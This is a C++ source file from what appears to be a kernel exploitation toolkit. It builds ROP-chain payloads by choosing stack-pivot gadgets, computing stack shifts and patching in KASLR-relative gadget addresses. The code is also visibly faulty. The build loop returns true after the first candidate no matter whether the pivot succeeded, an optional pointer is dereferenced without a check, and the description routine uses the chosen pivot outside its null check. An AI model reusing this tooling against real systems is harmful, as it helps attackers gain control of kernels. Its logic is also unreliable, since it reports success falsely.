#include <sstream>
#include <iomanip>

#include "pivot/PivotFinder.cpp"

#include "PayloadBuilder.h"


std::string intToHex(uint64_t value) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::uppercase << value;
    return ss.str();
}

void PayloadBuilder::AddPayload(Payload& payload,
                                 const std::vector<Register>& registers,
                                 std::optional<size_t> next_rip_offset) {
    payload_datas_.emplace_back(payload, registers, next_rip_offset);
}

void PayloadBuilder::AddPayload(Payload& payload,
                                 std::optional<Register> reg,
                                 std::optional<size_t> next_rip_offset) {
    std::vector<Register> regs;
    if (reg) regs.push_back(reg.value());
    payload_datas_.emplace_back(payload, regs, next_rip_offset);
}

void PayloadBuilder::AddRopChain(const RopChain& rop_chain) {
    std::vector<RopAction> new_actions = rop_chain.GetActions();
    rop_actions_.insert(rop_actions_.end(), new_actions.begin(), new_actions.end());
}

bool PayloadBuilder::build(bool need_pivot) {
    // if there's no pivot how do we know where we are building?? Assume the first payload?

    // Create a vector of references to the payloads
    std::vector<std::reference_wrapper<PayloadData>> data_refs;
    for (auto& data : payload_datas_) {
        data_refs.push_back(std::ref(data));
    }

    std::optional<uint64_t*> rip_pointer;

    // Iterate through the payloads and reserve offset which is used for rip;
    if (need_pivot) {
        for (const auto &data_ref : data_refs) {
            PayloadData &data = data_ref.get();
            if (data.next_rip_offset)
            {
                if(rip_pointer) throw ExpKitError("multiple rip_offsets");
                rip_pointer = (uint64_t*)data.payload.Reserve(data.next_rip_offset.value(), 8);
            }
        }
    }

    // Compute estimated sizes
    std::vector<std::tuple<std::reference_wrapper<PayloadData>, StackPivot, uint64_t>> items;
    for (const auto &data_ref : data_refs) {
        PayloadData &data = data_ref.get();
        PivotFinder pivot_finder(pivots_, data.registers, data.payload);
        for (auto& pivot : pivot_finder.FindAll()) {
            auto snapshot = data.payload.Snapshot();
            pivot.ApplyToPayload(snapshot, kaslr_base_);

            uint64_t offset = pivot.GetDestinationOffset();
            uint64_t estimated_size = EstimatePayloadSpaceAfter(snapshot, offset);
            items.push_back(std::make_tuple(data_ref, pivot, estimated_size));
        }
    }

    // sort by decreasing estimated size
    std::sort(items.begin(), items.end(),
            [](const auto& a, const auto& b) { //Use auto
                return std::get<2>(a) > std::get<2>(b);
            });

    // now try until we find a good one?
    for(auto& item: items) {
        if(TryPayloadPivot(std::get<0>(item).get().payload, std::get<1>(item))) {
            **rip_pointer = kaslr_base_ + std::get<1>(item).GetGadgetOffset();
        } return true;
    }

    return false; // Or true, depending on default success behavior.
}

std::string PayloadBuilder::GetDescription() {
    std::string str = "Payload built with:\n";
    if (chosen_pivot_) {
        str += "  Stack pivot: " + chosen_pivot_->GetDescription() + "\n";
    }
    uint64_t offset = chosen_pivot_->GetDestinationOffset()+8;

    for (int i = 0; i < chosen_shifts_.size(); i++) {
        const StackShiftingInfo &shift_info = chosen_shifts_[i];
        uint64_t to_offset = shift_info.to_offset;
        if(shift_info.stack_shifts.size() > 0) {
            uint64_t ret_offset = shift_info.next_ret_offset;
            str += "  Shifts: from " + intToHex(shift_info.from_offset) + " to next ret: " + 
                   intToHex(ret_offset) + " and stack pos: " + intToHex(to_offset) + "\n";
            for (auto& shift : shift_info.stack_shifts) {
                uint64_t sp_offset = offset + shift.pivot.shift_amount;
                uint64_t ret_offset = offset + shift.pivot.ret_offset;
                str += "    Stack shift @" + intToHex(shift.pivot.address) + " at offset: " + intToHex(shift.ret_offset) +
                    " next ret: " + intToHex(ret_offset) + " next sp: " + intToHex(sp_offset) + "\n";
            }
        }
        // TODO print where this is stored more clearly
        str += "  rop action of size: " + intToHex(rop_actions_[i].values.size()*8) + "\n";
    }

    return str;
}

bool PayloadBuilder::TryPayloadPivot(Payload& payload, StackPivot pivot) {
    auto snapshot = payload.Snapshot();
    pivot.ApplyToPayload(payload, kaslr_base_);

    PivotFinder pivot_finder(pivots_, {}, payload);

    uint64_t payload_off = pivot.GetDestinationOffset();

    chosen_shifts_.clear();

    // now we need to see if we can apply the all the rop actions, shifting to the next action as needed
    for (int i = 0; i < rop_actions_.size(); i++) {
        auto &action = rop_actions_[i];
        auto shifts = pivot_finder.GetShiftToRop(payload_off, 
                                                 action.values.size()*8, 
                                                 i != rop_actions_.size()-1 /* include_extra_slot */
                                                );

        if (!shifts ) {
            return false;
        }

        chosen_shifts_.push_back(*shifts);

        shifts->Apply(kaslr_base_, payload);
        std::vector<uint64_t> &rop_words = action.values;
        payload.Set(shifts->next_ret_offset, rop_words[0]);

        payload_off = shifts->to_offset;
        for(uint64_t i = 1; i < rop_words.size(); i++) {
            payload.Set(payload_off, rop_words[i]);
            payload_off += 8;
        }
    }
    
    chosen_pivot_ = pivot;
    chosen_payload_ = payload;
    return true;
}

uint64_t PayloadBuilder::EstimatePayloadSpaceAfter(Payload& payload, uint64_t offset) {
    uint64_t available = 0;
    uint64_t size = payload.Size();
    for(; offset < size; offset+=8) {
        if (payload.CheckFree(offset, 8)) {
            available += 8;
        }
    }
    return available;
}



